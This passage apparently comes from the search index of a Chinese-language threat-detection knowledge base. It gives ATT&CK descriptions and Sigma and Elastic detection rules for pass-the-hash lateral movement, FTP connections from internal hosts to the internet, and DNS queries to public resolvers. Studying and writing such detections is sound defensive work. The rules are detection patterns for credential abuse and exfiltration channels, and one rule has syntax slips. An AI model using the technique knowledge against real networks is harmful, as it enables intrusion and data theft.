\u767b\u5f55\u8fdb\u7a0b: seclogo \u8eab\u4efd\u9a8c\u8bc1\u6570\u636e\u5305: Negotiate \u4f20\u9012\u7684\u670d\u52a1: - \u6570\u636e\u5305\u540d(\u4ec5\u9650 NTLM): - \u5bc6\u94a5\u957f\u5ea6: 0","title":"\u653b\u51fb\u673a-PC2"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1550-002-win-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92/#_7","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1550-002-win-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92/#sigma","text":"title: Pass the Hash Activity\uff08\u76ee\u6807\u4e3b\u673a\uff09 id: f8d98d6c-7a07-4d74-b064-dd4a3c244528 status: experimental description: Detects the attack technique pass the hash which is used to move laterally inside the network references: - https://github.com/iadgov/Event-Forwarding-Guidance/tree/master/Events author: Ilias el Matani (rule), The Information Assurance Directorate at the NSA (method) date: 2017/03/08 tags: - attack.lateral_movement - attack.T1550-002 - car.2016-04-004 logsource: product: windows service: security definition: The successful use of PtH for lateral movement between workstations would trigger event ID 4624, a failed logon attempt would trigger an event ID 4625 detection: selection: - EventID: 4624 LogonType: '3' LogonProcessName: 'NtLmSsp' WorkstationName: '%Workstations%' ComputerName: '%Workstations%' - EventID: 4625 LogonType: '3' LogonProcessName: 'NtLmSsp' WorkstationName: '%Workstations%' ComputerName: '%Workstations%' filter: AccountName: 'ANONYMOUS LOGON' condition: selection and not filter falsepositives: - Administrator activity - Penetration tests level: medium title: Pass the Hash Activity 2\uff08\u653b\u51fb\u673a\uff09 id: 8eef149c-bd26-49f2-9e5a-9b00e3af499b status: production description: Detects the attack technique pass the hash which is used to move laterally inside the network references: - https://github.com/iadgov/Event-Forwarding-Guidance/tree/master/Events - https://blog.binarydefense.com/reliably-detecting-pass-the-hash-through-event-log-analysis - https://blog.stealthbits.com/how-to-detect-pass-the-hash-attacks/ author: Dave Kennedy, Jeff Warren (method) / David Vassallo (rule) date: 2019/06/14 tags: - attack.lateral_movement - attack.T1550-002 logsource: product: windows service: security definition: The successful use of PtH for lateral movement between workstations would trigger event ID 4624 detection: selection: - EventID: 4624 SubjectUserSid: 'S-1-0-0' LogonType: '3' LogonProcessName: 'NtLmSsp' KeyLength: '0' - EventID: 4624 #\u672a\u6d4b\u8bd5\u89e6\u53d1\u6b64\u7279\u5f81 LogonType: '9' LogonProcessName: 'seclogo' filter: AccountName: 'ANONYMOUS LOGON' condition: selection and not filter falsepositives: - Administrator activity - Penetration tests level: medium","title":"sigma\u89c4\u5219"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1550-002-win-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92/#_8","text":"\u89c4\u5219\u672a\u7ecf\u8fc7\u5b9e\u9645\u73af\u5883\u6d4b\u8bd5\u9a8c\u8bc1\u68c0\u6d4b\u6548\u679c\uff0c\u8c28\u614e\u4f7f\u7528\uff01","title":"\u5efa\u8bae"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1550-002-win-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92/#_9","text":"MITRE-ATT&CK-T1550-002 https://attack.mitre.org/techniques/T1550/002/ windows-\u54c8\u5e0c\u4f20\u90121 https://github.com/12306Bro/sigma/blob/master/rules/windows/builtin/win_pass_the_hash.yml windows-\u54c8\u5e0c\u4f20\u90122 https://github.com/12306Bro/sigma/blob/master/rules/windows/builtin/win_pass_the_hash_2.yml","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.002-win-%E5%86%85%E7%BD%91FTP%E9%93%BE%E6%8E%A5%E5%88%B0%E5%85%AC%E7%BD%91%E8%A1%8C%E4%B8%BA/","text":"T1071-002-win-\u5185\u7f51FTP\u94fe\u63a5\u5230\u516c\u7f51\u884c\u4e3a \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u4e0e\u4f20\u8f93\u6587\u4ef6\u5173\u8054\u7684\u5e94\u7528\u7a0b\u5e8f\u5c42\u534f\u8bae\u8fdb\u884c\u901a\u4fe1\uff0c\u4ee5\u514d\u4e0e\u73b0\u6709\u6d41\u91cf\u6df7\u5728\u4e00\u8d77\u8fdb\u884c\u68c0\u6d4b\u7f51\u7edc\u8fc7\u6ee4\u3002\u8fdc\u7a0b\u7cfb\u7edf\u7684\u547d\u4ee4\uff08\u901a\u5e38\u662f\u8fd9\u4e9b\u547d\u4ee4\u7684\u7ed3\u679c\uff09\u5c06\u5d4c\u5165\u5728\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u534f\u8bae\u6d41\u91cf\u4e2d\u3002 \u4f20\u8f93\u6587\u4ef6\u7684\u534f\u8bae\uff08\u4f8b\u5982FTP\uff0cFTPS\u548cTFTP\uff09\u5728\u73af\u5883\u4e2d\u53ef\u80fd\u5f88\u5e38\u89c1\u3002\u4ece\u8fd9\u4e9b\u534f\u8bae\u4ea7\u751f\u7684\u6570\u636e\u5305\u53ef\u80fd\u5177\u6709\u8bb8\u591a\u5b57\u6bb5\u548c\u6807\u5934\uff0c\u53ef\u4ee5\u5728\u5176\u4e2d\u9690\u85cf\u6570\u636e\u3002\u6570\u636e\u4e5f\u53ef\u4ee5\u9690\u85cf\u5728\u4f20\u8f93\u7684\u6587\u4ef6\u4e2d\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6ee5\u7528\u8fd9\u4e9b\u534f\u8bae\u4ee5\u4e0e\u53d7\u5bb3\u7f51\u7edc\u4e2d\u53d7\u5176\u63a7\u5236\u7684\u7cfb\u7edf\u8fdb\u884c\u901a\u4fe1\uff0c\u540c\u65f6\u8fd8\u4f1a\u6a21\u4eff\u6b63\u5e38\u7684\u9884\u671f\u6d41\u91cf\u3002 \u6d4b\u8bd5\u6848\u4f8b \u68c0\u6d4b\u53ef\u80fd\u4f7f\u7528FTP\u7f51\u7edc\u8fde\u63a5\u5230Internet\u7684\u4e8b\u4ef6\u3002\u81ea1980\u5e74\u4ee3\u4ee5\u6765\uff0c\u6587\u4ef6\u4f20\u8f93\u534f\u8bae\uff08FTP\uff09\u4e00\u76f4\u4ee5\u5176\u5f53\u524d\u5f62\u5f0f\u51fa\u73b0\u3002\u5728\u7f51\u7edc\u4e0a\u53d1\u9001\u548c\u63a5\u6536\u6587\u4ef6\u53ef\u80fd\u662f\u5e38\u89c1\u4e14\u6709\u6548\u7684\u8fc7\u7a0b\u3002\u56e0\u6b64\uff0c\u653b\u51fb\u8005\u8fd8\u7ecf\u5e38\u4f7f\u7528\u6b64\u534f\u8bae\u4ece\u60a8\u7684\u7f51\u7edc\u4e2d\u7a83\u53d6\u6570\u636e\u6216\u4e0b\u8f7d\u65b0\u5de5\u5177\u3002\u6b64\u5916\uff0cFTP\u662f\u7eaf\u6587\u672c\u534f\u8bae\uff0c\u5982\u679c\u88ab\u62e6\u622a\uff0c\u5219\u53ef\u80fd\u4f1a\u516c\u5f00\u7528\u6237\u540d\u548c\u5bc6\u7801\u3002 \u68c0\u6d4b\u65e5\u5fd7 network \u6d4b\u8bd5\u590d\u73b0 \u6682\u65e0 \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0\uff0c\u4ec5\u63d0\u4f9b\u68c0\u6d4b\u89c4\u5219\u76f8\u5173\u7684\u65e5\u5fd7\u793a\u4f8b \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: \u68c0\u6d4b\u5185\u7f51FTP\u94fe\u63a5\u5230\u516c\u7f51\u884c\u4e3a description: \u901a\u8fc7NETWORK\u68c0\u6d4b\u5185\u7f51FTP\u94fe\u63a5\u5230\u516c\u7f51\u884c\u4e3a tags: T1071.002 status: experimental references: - https://www.elastic.co/guide/en/siem/guide/current/ftp-file-transfer-protocol-activity-to-the-internet.html#ftp-file-transfer-protocol-activity-to-the-internet logsource: product: network detection: selection1: Type: tcp destination.port: - 21 - 20 selection2: source.ip: - 10.0.0.0/8 - 172.16.0.0/12 - 192.168.0.0/16 selection3: destination.ip: - 10.0.0.0/8 - 172.16.0.0/12 - 192.168.0.0/16 condition: (selection1 and selection2) and not selection3) level: low Elastic rule query network.transport: tcp and destination.port: (20 or 21) and ( network.direction: outbound or ( source.ip: (10.0.0.0/8 or 172.16.0.0/12 or 192.168.0.0/16) and not destination.ip: (10.0.0.0/8 or 172.16.0.0/12 or 192.168.0.0/16) ) ) \u5efa\u8bae \u89c4\u5219\u672a\u7ecf\u7ebf\u4e0a\u6d4b\u8bd5\uff0c\u8c28\u614e\u4f7f\u7528\uff0c\u4f46\u662f\u6211\u76f8\u4fe1\u5b83\u80fd\u591f\u5f88\u597d\u7684\u5e2e\u52a9\u4f60\u53d1\u73b0\u7f51\u5185\u7684\u5a01\u80c1\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1071-002 https://attack.mitre.org/techniques/T1071/002/ \u68c0\u6d4b\u5185\u7f51FTP\u94fe\u63a5\u5230\u516c\u7f51\u884c\u4e3a https://www.elastic.co/guide/en/siem/guide/current/ftp-file-transfer-protocol-activity-to-the-internet.html#ftp-file-transfer-protocol-activity-to-the-internet","title":"T1071-002-win-\u5185\u7f51FTP\u94fe\u63a5\u5230\u516c\u7f51\u884c\u4e3a"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.002-win-%E5%86%85%E7%BD%91FTP%E9%93%BE%E6%8E%A5%E5%88%B0%E5%85%AC%E7%BD%91%E8%A1%8C%E4%B8%BA/#t1071-002-win-ftp","text":"","title":"T1071-002-win-\u5185\u7f51FTP\u94fe\u63a5\u5230\u516c\u7f51\u884c\u4e3a"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.002-win-%E5%86%85%E7%BD%91FTP%E9%93%BE%E6%8E%A5%E5%88%B0%E5%85%AC%E7%BD%91%E8%A1%8C%E4%B8%BA/#attck","text":"\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u4e0e\u4f20\u8f93\u6587\u4ef6\u5173\u8054\u7684\u5e94\u7528\u7a0b\u5e8f\u5c42\u534f\u8bae\u8fdb\u884c\u901a\u4fe1\uff0c\u4ee5\u514d\u4e0e\u73b0\u6709\u6d41\u91cf\u6df7\u5728\u4e00\u8d77\u8fdb\u884c\u68c0\u6d4b\u7f51\u7edc\u8fc7\u6ee4\u3002\u8fdc\u7a0b\u7cfb\u7edf\u7684\u547d\u4ee4\uff08\u901a\u5e38\u662f\u8fd9\u4e9b\u547d\u4ee4\u7684\u7ed3\u679c\uff09\u5c06\u5d4c\u5165\u5728\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u534f\u8bae\u6d41\u91cf\u4e2d\u3002 \u4f20\u8f93\u6587\u4ef6\u7684\u534f\u8bae\uff08\u4f8b\u5982FTP\uff0cFTPS\u548cTFTP\uff09\u5728\u73af\u5883\u4e2d\u53ef\u80fd\u5f88\u5e38\u89c1\u3002\u4ece\u8fd9\u4e9b\u534f\u8bae\u4ea7\u751f\u7684\u6570\u636e\u5305\u53ef\u80fd\u5177\u6709\u8bb8\u591a\u5b57\u6bb5\u548c\u6807\u5934\uff0c\u53ef\u4ee5\u5728\u5176\u4e2d\u9690\u85cf\u6570\u636e\u3002\u6570\u636e\u4e5f\u53ef\u4ee5\u9690\u85cf\u5728\u4f20\u8f93\u7684\u6587\u4ef6\u4e2d\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6ee5\u7528\u8fd9\u4e9b\u534f\u8bae\u4ee5\u4e0e\u53d7\u5bb3\u7f51\u7edc\u4e2d\u53d7\u5176\u63a7\u5236\u7684\u7cfb\u7edf\u8fdb\u884c\u901a\u4fe1\uff0c\u540c\u65f6\u8fd8\u4f1a\u6a21\u4eff\u6b63\u5e38\u7684\u9884\u671f\u6d41\u91cf\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.002-win-%E5%86%85%E7%BD%91FTP%E9%93%BE%E6%8E%A5%E5%88%B0%E5%85%AC%E7%BD%91%E8%A1%8C%E4%B8%BA/#_1","text":"\u68c0\u6d4b\u53ef\u80fd\u4f7f\u7528FTP\u7f51\u7edc\u8fde\u63a5\u5230Internet\u7684\u4e8b\u4ef6\u3002\u81ea1980\u5e74\u4ee3\u4ee5\u6765\uff0c\u6587\u4ef6\u4f20\u8f93\u534f\u8bae\uff08FTP\uff09\u4e00\u76f4\u4ee5\u5176\u5f53\u524d\u5f62\u5f0f\u51fa\u73b0\u3002\u5728\u7f51\u7edc\u4e0a\u53d1\u9001\u548c\u63a5\u6536\u6587\u4ef6\u53ef\u80fd\u662f\u5e38\u89c1\u4e14\u6709\u6548\u7684\u8fc7\u7a0b\u3002\u56e0\u6b64\uff0c\u653b\u51fb\u8005\u8fd8\u7ecf\u5e38\u4f7f\u7528\u6b64\u534f\u8bae\u4ece\u60a8\u7684\u7f51\u7edc\u4e2d\u7a83\u53d6\u6570\u636e\u6216\u4e0b\u8f7d\u65b0\u5de5\u5177\u3002\u6b64\u5916\uff0cFTP\u662f\u7eaf\u6587\u672c\u534f\u8bae\uff0c\u5982\u679c\u88ab\u62e6\u622a\uff0c\u5219\u53ef\u80fd\u4f1a\u516c\u5f00\u7528\u6237\u540d\u548c\u5bc6\u7801\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.002-win-%E5%86%85%E7%BD%91FTP%E9%93%BE%E6%8E%A5%E5%88%B0%E5%85%AC%E7%BD%91%E8%A1%8C%E4%B8%BA/#_2","text":"network","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.002-win-%E5%86%85%E7%BD%91FTP%E9%93%BE%E6%8E%A5%E5%88%B0%E5%85%AC%E7%BD%91%E8%A1%8C%E4%B8%BA/#_3","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.002-win-%E5%86%85%E7%BD%91FTP%E9%93%BE%E6%8E%A5%E5%88%B0%E5%85%AC%E7%BD%91%E8%A1%8C%E4%B8%BA/#_4","text":"\u6682\u65e0\uff0c\u4ec5\u63d0\u4f9b\u68c0\u6d4b\u89c4\u5219\u76f8\u5173\u7684\u65e5\u5fd7\u793a\u4f8b","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.002-win-%E5%86%85%E7%BD%91FTP%E9%93%BE%E6%8E%A5%E5%88%B0%E5%85%AC%E7%BD%91%E8%A1%8C%E4%B8%BA/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.002-win-%E5%86%85%E7%BD%91FTP%E9%93%BE%E6%8E%A5%E5%88%B0%E5%85%AC%E7%BD%91%E8%A1%8C%E4%B8%BA/#sigma","text":"title: \u68c0\u6d4b\u5185\u7f51FTP\u94fe\u63a5\u5230\u516c\u7f51\u884c\u4e3a description: \u901a\u8fc7NETWORK\u68c0\u6d4b\u5185\u7f51FTP\u94fe\u63a5\u5230\u516c\u7f51\u884c\u4e3a tags: T1071.002 status: experimental references: - https://www.elastic.co/guide/en/siem/guide/current/ftp-file-transfer-protocol-activity-to-the-internet.html#ftp-file-transfer-protocol-activity-to-the-internet logsource: product: network detection: selection1: Type: tcp destination.port: - 21 - 20 selection2: source.ip: - 10.0.0.0/8 - 172.16.0.0/12 - 192.168.0.0/16 selection3: destination.ip: - 10.0.0.0/8 - 172.16.0.0/12 - 192.168.0.0/16 condition: (selection1 and selection2) and not selection3) level: low","title":"sigma\u89c4\u5219"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.002-win-%E5%86%85%E7%BD%91FTP%E9%93%BE%E6%8E%A5%E5%88%B0%E5%85%AC%E7%BD%91%E8%A1%8C%E4%B8%BA/#elastic-rule-query","text":"network.transport: tcp and destination.port: (20 or 21) and ( network.direction: outbound or ( source.ip: (10.0.0.0/8 or 172.16.0.0/12 or 192.168.0.0/16) and not destination.ip: (10.0.0.0/8 or 172.16.0.0/12 or 192.168.0.0/16) ) )","title":"Elastic rule query"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.002-win-%E5%86%85%E7%BD%91FTP%E9%93%BE%E6%8E%A5%E5%88%B0%E5%85%AC%E7%BD%91%E8%A1%8C%E4%B8%BA/#_6","text":"\u89c4\u5219\u672a\u7ecf\u7ebf\u4e0a\u6d4b\u8bd5\uff0c\u8c28\u614e\u4f7f\u7528\uff0c\u4f46\u662f\u6211\u76f8\u4fe1\u5b83\u80fd\u591f\u5f88\u597d\u7684\u5e2e\u52a9\u4f60\u53d1\u73b0\u7f51\u5185\u7684\u5a01\u80c1\u3002","title":"\u5efa\u8bae"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.002-win-%E5%86%85%E7%BD%91FTP%E9%93%BE%E6%8E%A5%E5%88%B0%E5%85%AC%E7%BD%91%E8%A1%8C%E4%B8%BA/#_7","text":"MITRE-ATT&CK-T1071-002 https://attack.mitre.org/techniques/T1071/002/ \u68c0\u6d4b\u5185\u7f51FTP\u94fe\u63a5\u5230\u516c\u7f51\u884c\u4e3a https://www.elastic.co/guide/en/siem/guide/current/ftp-file-transfer-protocol-activity-to-the-internet.html#ftp-file-transfer-protocol-activity-to-the-internet","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.004-win-%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E5%90%91%E5%85%AC%E7%BD%91DNS%E5%8F%91%E8%B5%B7%E5%8F%AF%E7%96%91%E8%AF%B7%E6%B1%82%E8%A1%8C%E4%B8%BA/","text":"T1071-004-win-\u5185\u4e3b\u673a\u5411\u516c\u7f51DNS\u53d1\u8d77\u53ef\u7591\u8bf7\u6c42\u884c\u4e3a \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u57df\u540d\u7cfb\u7edf\uff08DNS\uff09\u5e94\u7528\u5c42\u534f\u8bae\u8fdb\u884c\u901a\u4fe1\uff0c\u4ee5\u514d\u901a\u8fc7\u4e0e\u73b0\u6709\u6d41\u91cf\u6df7\u5408\u6765\u8fdb\u884c\u68c0\u6d4b/\u7f51\u7edc\u8fc7\u6ee4\u3002\u8fdc\u7a0b\u7cfb\u7edf\u7684\u547d\u4ee4\uff08\u901a\u5e38\u662f\u8fd9\u4e9b\u547d\u4ee4\u7684\u7ed3\u679c\uff09\u5c06\u5d4c\u5165\u5728\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u534f\u8bae\u6d41\u91cf\u4e2d\u3002 DNS\u534f\u8bae\u5728\u8ba1\u7b97\u673a\u7f51\u7edc\u4e2d\u8d77\u7ba1\u7406\u529f\u80fd\uff0c\u56e0\u6b64\u5728\u73af\u5883\u4e2d\u53ef\u80fd\u975e\u5e38\u5e38\u89c1\u3002\u5373\u4f7f\u5728\u5b8c\u6210\u7f51\u7edc\u8eab\u4efd\u9a8c\u8bc1\u4e4b\u524d\uff0c\u4e5f\u53ef\u80fd\u5141\u8bb8DNS\u901a\u4fe1\u3002DNS\u6570\u636e\u5305\u5305\u542b\u8bb8\u591a\u5b57\u6bb5\u548c\u6807\u5934\uff0c\u53ef\u4ee5\u5728\u5176\u4e2d\u9690\u85cf\u6570\u636e\u3002\u653b\u51fb\u8005\u901a\u5e38\u88ab\u79f0\u4e3aDNS\u96a7\u9053\uff0c\u53ef\u4ee5\u6ee5\u7528DNS\u4e0e\u53d7\u5bb3\u7f51\u7edc\u5185\u53d7\u5176\u63a7\u5236\u7684\u7cfb\u7edf\u8fdb\u884c\u901a\u4fe1\uff0c\u540c\u65f6\u8fd8\u6a21\u4eff\u6b63\u5e38\u7684\u9884\u671f\u6d41\u91cf\u3002 \u6d4b\u8bd5\u6848\u4f8b \u68c0\u6d4b\u5185\u90e8\u7f51\u7edc\u5ba2\u6237\u7aef\u4f55\u65f6\u5c06DNS\u6d41\u91cf\u76f4\u63a5\u53d1\u9001\u5230\u516c\u7f51\u4e0a\u3002\u5bf9\u4e8e\u6258\u7ba1\u7f51\u7edc\u6765\u8bf4\uff0c\u8fd9\u662f\u975e\u5178\u578b\u7684\u884c\u4e3a\uff0c\u5e76\u4e14\u53ef\u4ee5\u6307\u793a\u6076\u610f\u8f6f\u4ef6\uff0c\u6e17\u900f\uff0c\u547d\u4ee4\u548c\u63a7\u5236\uff0c\u6216\u8005\u7b80\u5355\u5730\u6307\u51fa\u914d\u7f6e\u9519\u8bef\u3002\u6b64DNS\u6d3b\u52a8\u8fd8\u4f1a\u5f71\u54cd\u60a8\u7684\u7ec4\u7ec7\u63d0\u4f9b\u4f01\u4e1a\u76d1\u89c6\u548cDNS\u65e5\u5fd7\u8bb0\u5f55\u7684\u80fd\u529b\uff0c\u5e76\u4f7f\u60a8\u7684\u7f51\u7edc\u5bb9\u6613\u906d\u53d7\u5404\u79cd\u6ee5\u7528\u548c\u6076\u610f\u901a\u4fe1\u3002 \u53c2\u8003\u6587\u732e\uff1a https://www.us-cert.gov/ncas/alerts/TA15-240A https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-81-2.pdf \u68c0\u6d4b\u65e5\u5fd7 Network \u6d4b\u8bd5\u590d\u73b0 \u6682\u65e0 \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: \u68c0\u6d4b\u5185\u7f51\u4e3b\u673a\u5411\u516c\u7f51dns\u53d1\u8d77\u53ef\u7591\u8bf7\u6c42\u884c\u4e3a description: \u901a\u8fc7\u7f51\u7edc\u6d41\u91cf\u68c0\u6d4b\u5185\u7f51\u4e3b\u673a\u5411\u516c\u7f51dns\u53d1\u8d77\u53ef\u7591\u8bf7\u6c42\u884c\u4e3a tags: T1071\u3002004 status: experimental references: - https://www.elastic.co/guide/en/siem/guide/current/dns-activity-to-the-internet.html logsource: product: network detection: selection1: destination.port: 53 selection2: source.ip: - 10.0.0.0/8 - 172.16.0.0/12 - 192.168.0.0/16 slection3: destination.ip: - 10.0.0.0/8 - 127.0.0.0/8 - 169.254.169.254/32 - 172.16.0.0/12 - 192.168.0.0/16 - 224.0.0.251 - 224.0.0.252 - ::1 - 255.255.255.255 - ff02::fb condition: selection1 and not selection2 level: medium Elastic rule query destination.port:53 and source.ip:(10.0.0.0/8 or 172.16.0.0/12 or 192.168.0.0/16) and not destination.ip:(10.0.0.0/8 or 127.0.0.0/8 or 169.254.169.254/32 or 172.16.0.0/12 or 192.168.0.0/16 or 224.0.0.251 or 224.0.0.252 or 255.255.255.255 or \"::1\" or \"ff02::fb\") \u5efa\u8bae \u4ece\u8fd9\u6761\u89c4\u5219\u4e2d\u6392\u9664DNS\u670d\u52a1\u5668\uff0c\u56e0\u4e3a\u8fd9\u662f\u9884\u671f\u7684\u884c\u4e3a\u3002\u7aef\u70b9\u901a\u5e38\u67e5\u8be2\u5728\u5176DHCP\u4f5c\u7528\u57df\u4e2d\u5b9a\u4e49\u7684\u672c\u5730DNS\u670d\u52a1\u5668\uff0c\u4f46\u662f\u5982\u679c\u7528\u6237\u5c06\u5176\u7aef\u70b9\u914d\u7f6e\u4e3a\u4f7f\u7528\u8fdc\u7a0bDNS\u670d\u52a1\u5668\uff0c\u5219\u53ef\u4ee5\u8986\u76d6\u8be5\u7aef\u70b9\u3002\u8fd9\u5728\u53d7\u7ba1\u4f01\u4e1a\u7f51\u7edc\u4e2d\u5e76\u4e0d\u5e38\u89c1\uff0c\u56e0\u4e3a\u4f7f\u7528\u6c34\u5e73\u5206\u5272DNS\u53ef\u80fd\u4f1a\u7834\u574fIntranet\u540d\u79f0\u89e3\u6790\u3002\u67d0\u4e9b\u6d88\u8d39\u8005VPN\u670d\u52a1\u548c\u6d4f\u89c8\u5668\u63d2\u4ef6\u53ef\u80fd\u4f1a\u5c06DNS\u6d41\u91cf\u53d1\u9001\u5230\u8fdc\u7a0bInternet\u76ee\u7684\u5730\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5f53\u8fd9\u662f\u9884\u671f\u7684\u884c\u4e3a\u65f6\uff0c\u53ef\u4ee5\u4ece\u6b64\u89c4\u5219\u4e2d\u6392\u9664\u6b64\u7c7b\u8bbe\u5907\u6216\u7f51\u7edc\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1071.004 https://attack.mitre.org/techniques/T1071/004/ \u68c0\u6d4b\u5185\u7f51\u4e3b\u673a\u5411\u516c\u7f51dns\u53d1\u8d77\u53ef\u7591\u8bf7\u6c42\u884c\u4e3a https://www.elastic.co/guide/en/siem/guide/current/dns-activity-to-the-internet.html","title":"T1071-004-win-\u5185\u4e3b\u673a\u5411\u516c\u7f51DNS\u53d1\u8d77\u53ef\u7591\u8bf7\u6c42\u884c\u4e3a"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.004-win-%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E5%90%91%E5%85%AC%E7%BD%91DNS%E5%8F%91%E8%B5%B7%E5%8F%AF%E7%96%91%E8%AF%B7%E6%B1%82%E8%A1%8C%E4%B8%BA/#t1071-004-win-dns","text":"","title":"T1071-004-win-\u5185\u4e3b\u673a\u5411\u516c\u7f51DNS\u53d1\u8d77\u53ef\u7591\u8bf7\u6c42\u884c\u4e3a"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.004-win-%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E5%90%91%E5%85%AC%E7%BD%91DNS%E5%8F%91%E8%B5%B7%E5%8F%AF%E7%96%91%E8%AF%B7%E6%B1%82%E8%A1%8C%E4%B8%BA/#attck","text":"\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u57df\u540d\u7cfb\u7edf\uff08DNS\uff09\u5e94\u7528\u5c42\u534f\u8bae\u8fdb\u884c\u901a\u4fe1\uff0c\u4ee5\u514d\u901a\u8fc7\u4e0e\u73b0\u6709\u6d41\u91cf\u6df7\u5408\u6765\u8fdb\u884c\u68c0\u6d4b/\u7f51\u7edc\u8fc7\u6ee4\u3002\u8fdc\u7a0b\u7cfb\u7edf\u7684\u547d\u4ee4\uff08\u901a\u5e38\u662f\u8fd9\u4e9b\u547d\u4ee4\u7684\u7ed3\u679c\uff09\u5c06\u5d4c\u5165\u5728\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u534f\u8bae\u6d41\u91cf\u4e2d\u3002 DNS\u534f\u8bae\u5728\u8ba1\u7b97\u673a\u7f51\u7edc\u4e2d\u8d77\u7ba1\u7406\u529f\u80fd\uff0c\u56e0\u6b64\u5728\u73af\u5883\u4e2d\u53ef\u80fd\u975e\u5e38\u5e38\u89c1\u3002\u5373\u4f7f\u5728\u5b8c\u6210\u7f51\u7edc\u8eab\u4efd\u9a8c\u8bc1\u4e4b\u524d\uff0c\u4e5f\u53ef\u80fd\u5141\u8bb8DNS\u901a\u4fe1\u3002DNS\u6570\u636e\u5305\u5305\u542b\u8bb8\u591a\u5b57\u6bb5\u548c\u6807\u5934\uff0c\u53ef\u4ee5\u5728\u5176\u4e2d\u9690\u85cf\u6570\u636e\u3002\u653b\u51fb\u8005\u901a\u5e38\u88ab\u79f0\u4e3aDNS\u96a7\u9053\uff0c\u53ef\u4ee5\u6ee5\u7528DNS\u4e0e\u53d7\u5bb3\u7f51\u7edc\u5185\u53d7\u5176\u63a7\u5236\u7684\u7cfb\u7edf\u8fdb\u884c\u901a\u4fe1\uff0c\u540c\u65f6\u8fd8\u6a21\u4eff\u6b63\u5e38\u7684\u9884\u671f\u6d41\u91cf\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1071.004-win-%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E5%90%91%E5%85%AC%E7%BD%91DNS%E5%8F%91%E8%B5%B7%E5%8F%AF%E7%96%91%E8%AF%B7%E6%B1%82%E8%A1%8C%E4%B8%BA/#_1","text":"\u68c0\u6d4b\u5185\u90e8\u7f51\u7edc\u5ba2\u6237\u7aef\u4f55\u65f6\u5c06DNS\u6d41\u91cf\u76f4\u63a5\u5